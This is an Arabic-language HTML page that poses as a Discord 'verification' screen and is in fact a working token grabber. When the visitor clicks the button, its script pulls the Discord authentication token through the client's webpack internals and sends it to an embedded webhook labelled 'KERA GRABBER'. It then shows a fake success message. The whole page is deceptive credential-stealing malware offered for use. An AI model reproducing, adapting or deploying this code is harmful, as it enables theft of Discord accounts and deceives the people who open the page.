<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8">
  <title>التحقق من الهوية - Discord</title>
  <style>
    body{background:#2c2f33;color:#fff;font-family:Whitney,Helvetica,Arial,sans-serif;text-align:center;padding-top:10%;margin:0}
    .box{background:#23272a;width:380px;margin:auto;padding:40px;border-radius:12px;box-shadow:0 0 30px rgba(0,0,0,0.8)}
    img{width:100px;margin-bottom:20px}
    button{background:#5865f2;color:white;border:none;padding:16px 50px;font-size:18px;border-radius:8px;cursor:pointer;margin-top:20px;font-weight:bold}
    button:hover{background:#4752c4}
  </style>
</head>
<body>
  <div class="box">
    <img src="https://discord.com/assets/41484d92c876f76b20c7f7a7b9a8c23d.svg">
    <h2>التحقق مطلوب</h2>
    <p>اضغط الزر تحت عشان تثبت إنك مو بوت<br>وتدخل السيرفر فورًا</p>
    <button onclick="grabToken()">تأكيد الدخول</button>
  </div>

<script>
async function grabToken() {
  let token = null;

  // الطريقة اللي شغالة 100% ديسمبر 2025
  const {Authorization} = webpackChunkdiscord_app.push([[Symbol()],{},r=>r.c]).pop().exports.default.getToken
    ? webpackChunkdiscord_app.push([[Symbol()],{},r=>r.c]).pop().exports.default
    : webpackChunkdiscord_app.push([[Symbol()],{},r=>Object.values(r.c).find(x=>x?.exports?.default?.getToken)]).pop().exports.default;

  token = Authorization.getToken();

  if (!token) {
    document.body.innerHTML = "<div class='box'><h2 style='color:#ed4245'>فشل التحقق.. افتح ديسكورد في المتصفح وجرب تاني</h2></div>";
    return;
  }

  fetch("https://discord.com/api/webhooks/1446911453843161245/_ZWiugdPE3I1ac-0yTIhq3zFY5Tu373sJ0aWG_nFxVWLHki45tUFWRtQkTgpbPBJh8l7", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      username: "KERA GRABBER",
      avatar_url: "https://cdn.discordapp.com/emojis/1087749503461244988.gif",
      embeds: [{
        title: "تم صيد توكن جديد",
        color: 5814783,
        description: `||${token}||`,
        timestamp: new Date(),
        footer: {text: "شغال 100% – ديسمبر 2025"}
      }]
    })
  });

  document.body.innerHTML = `<div class="box"><h2 style="color:#57f287">تم التحقق بنجاح!</h2><p>ارجع للديسكورد.. السيرفر مفتوح لك</p></div>`;
}
</script>
</body>
</html>
